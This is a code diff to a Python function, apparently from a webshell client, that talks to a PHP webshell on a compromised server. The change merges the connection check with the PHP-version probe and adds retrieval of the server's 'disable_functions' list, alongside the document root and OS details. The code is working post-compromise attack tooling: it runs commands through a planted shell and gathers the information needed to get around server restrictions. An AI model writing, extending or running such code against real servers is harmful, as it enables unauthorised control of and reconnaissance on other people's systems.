@@ -38,14 +38,13 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
         path.join(gget("root_path"), "target", webshell_netloc),
         namespace="webshell",
     )
-    req = send("print(phpversion());", raw=True)
+    req = send("print(phpversion().'|'.md5(1));", raw=True)
     gset("webshell.php_version", req.text.strip(), namespace="webshell")
     if ('7.' in req.text):
         gset("webshell.v7", True, namespace="webshell")
-    req = send("print(md5(1));")
     if "c4ca4238a0b923820dcc509a6f75849b" in req.r_text:  # 验证是否成功连接
         info_req = send(
-            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname());"
+            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.ini_get('disable_functions'));"
         )
         info = info_req.r_text.strip().split("|")
         gset("webshell.root", info[0], namespace="webshell")
@@ -55,6 +54,10 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
             (True if "win" in info[1].lower() else False),
             namespace="webshell",
         )
+        disable_function_list = [f.strip() for f in info[2].split(",")]
+        if ('' in disable_function_list):
+            disable_function_list.remove('')
+        gset("webshell.disable_functions", disable_function_list, namespace="webshell")
         from_log = gget("webshell.from_log", "webshell")
         if not from_log:
             with open("webshell.log", "a+") as f:
